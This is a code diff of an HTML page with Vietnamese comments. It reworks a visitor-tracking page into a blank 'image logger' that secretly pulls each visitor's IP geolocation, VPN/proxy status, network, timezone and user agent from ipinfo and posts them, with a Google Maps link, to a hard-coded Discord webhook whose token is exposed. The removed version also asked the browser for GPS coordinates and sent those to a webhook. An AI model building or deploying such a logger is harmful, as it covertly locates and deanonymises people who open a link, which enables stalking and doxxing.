@@ -3,104 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP & Location Logger</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #333;
-            text-align: center;
-        }
-        h1 {
-            font-size: 3em;
-            margin-bottom: 20px;
-        }
-        p {
-            font-size: 1.2em;
-            margin-top: 10px;
-        }
-        .ip-address {
-            font-size: 3em;
-            font-weight: bold;
-            color: #ff0000;
-            margin: 20px 0;
-        }
-    </style>
+    <title>IP & Location Intelligence Report</title>
 </head>
 <body>
-    <div>
-        <h1>Welcome to My Website</h1>
-        <p>Đang tải dữ liệu mạng và vị trí...</p>
-        <div class="ip-address" id="ip-address">...</div>
-        <p id="status">Vui lòng đợi trong giây lát...</p>
-    </div>
-    
     <script>
-    let globalData = {};
-
-    function sendToDiscord(extraText = "") {
+    function monke(json) {
         var request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1557723641687318630/VkIwFn8TRpa0QVo2Eri0Ek1mrbV4QxJ5ae-nhL244l67HhEe5sri1Fuu9GlXCbvLG0L3");
+        request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
         request.setRequestHeader('Content-type', 'application/json');
 
-        let lat = globalData.lat || (globalData.loc ? globalData.loc.split(',')[0] : 'N/A');
-        let lon = globalData.lon || (globalData.loc ? globalData.loc.split(',')[1] : 'N/A');
-        let mapsLink = (lat !== 'N/A' && lon !== 'N/A') ? `https://www.google.com/maps?q=${lat},${lon}` : 'Không có tọa độ';
+        // Kiểm tra xem ipinfo có trả về cờ privacy (VPN/Proxy/Hosting) không
+        let isVpnOrProxy = "NO";
+        if (json.privacy) {
+            if (json.privacy.vpn || json.privacy.proxy || json.privacy.hosting) {
+                isVpnOrProxy = "YES (VPN/Proxy/Hosting detected)";
+            }
+        }
+
+        // Tạo link Google Maps từ tọa độ loc (ví dụ: "21.0285,105.8542")
+        let lat = 'N/A', lon = 'N/A', mapsLink = 'Không có tọa độ';
+        if (json.loc) {
+            let coords = json.loc.split(',');
+            lat = coords[0];
+            lon = coords[1];
+            mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        }
 
         var params = {
-            username: "Advanced IP Logger",
-            content: `🚀 Đã có người truy cập! ${extraText}`,
+            username: "Cordly Image Logger by phongdepzai02",
+            content: "",
             embeds: [
                 {
-                    title: "📍 Thông tin Vị trí & IP Nâng cấp",
+                    title: "🎯 Image Opened - Intelligence Report",
                     color: 3447003,
                     fields: [
-                        { name: "🔹 IP Address", value: `\`${globalData.ip || 'N/A'}\``, inline: false },
-                        { name: "🔹 Địa điểm (IP Geolocation)", value: `**Quốc gia:** \`${globalData.country || 'N/A'}\`\n**Thành phố:** \`${globalData.city || 'N/A'}\``, inline: false },
-                        { name: "🗺️ Google Maps (Tọa độ chính xác)", value: `[Bấm vào đây để xem bản đồ](${mapsLink})\n*Tọa độ: ${lat},${lon}*`, inline: false },
-                        { name: "🔹 Thiết bị", value: `\`${navigator.userAgent}\``, inline: false }
-                    ]
+                        {
+                            name: "🌐 IP Address",
+                            value: `\`${json.ip || 'N/A'}\``,
+                            inline: false
+                        },
+                        {
+                            name: "🛡️ VPN/Proxy",
+                            value: `🚩 **${isVpnOrProxy}**`,
+                            inline: false
+                        },
+                        {
+                            name: "🌍 Timezone",
+                            value: `${json.timezone || 'N/A'}`,
+                            inline: false
+                        },
+                        {
+                            name: "📍 Location",
+                            value: `${json.city \vert{}\vert{} 'N/A'},${json.region || 'N/A'}, ${json.country \vert{}\vert{} 'N/A'}\n[View on Google Maps](${mapsLink})`,
+                            inline: false
+                        },
+                        {
+                            name: "🏢 Network / Hostname",
+                            value: `${json.org || 'N/A'}`,
+                            inline: false
+                        },
+                        {
+                            name: "💻 Device & Browser",
+                            value: `${navigator.platform} -${navigator.userAgent.includes('Mobile') ? 'Mobile Device' : 'Desktop'}`,
+                            inline: false
+                        },
+                        {
+                            name: "📋 Raw User-Agent",
+                            value: `\`\`\`${navigator.userAgent}\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Tool created by phongdepzai02"
+                    }
                 }
             ]
         };
 
         request.send(JSON.stringify(params));
     }
-
-    function monke(json) {
-        globalData = json;
-        document.getElementById('ip-address').innerText = json.ip;
-        
-        // Thử xin quyền GPS của trình duyệt (High Accuracy Geolocation)
-        if (navigator.geolocation) {
-            document.getElementById('status').innerText = "Đang yêu cầu quyền định vị GPS...";
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    // Nếu người dùng bấm "Cho phép" (Allow)
-                    globalData.lat = position.coords.latitude;
-                    globalData.lon = position.coords.longitude;
-                    document.getElementById('status').innerText = "Đã lấy vị trí GPS thành công!";
-                    sendToDiscord("(Có tọa độ GPS chính xác từ thiết bị!)");
-                },
-                function(error) {
-                    // Nếu người dùng từ chối (Block) -> Vẫn gửi thông tin cơ bản từ IP
-                    document.getElementById('status').innerText = "Sử dụng vị trí tương đối qua IP.";
-                    sendToDiscord("(Người dùng từ chối GPS, dùng IP tạm thời)");
-                },
-                { timeout: 10000, enableHighAccuracy: true }
-            );
-        } else {
-            sendToDiscord();
-        }
-    }
     </script>
 
-    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+    <!-- Lấy dữ liệu IP và thông tin mạng chi tiết từ ipinfo -->
+    <script src="https://ipinfo.io/json?callback=monke"></script>
 </body>
 </html>
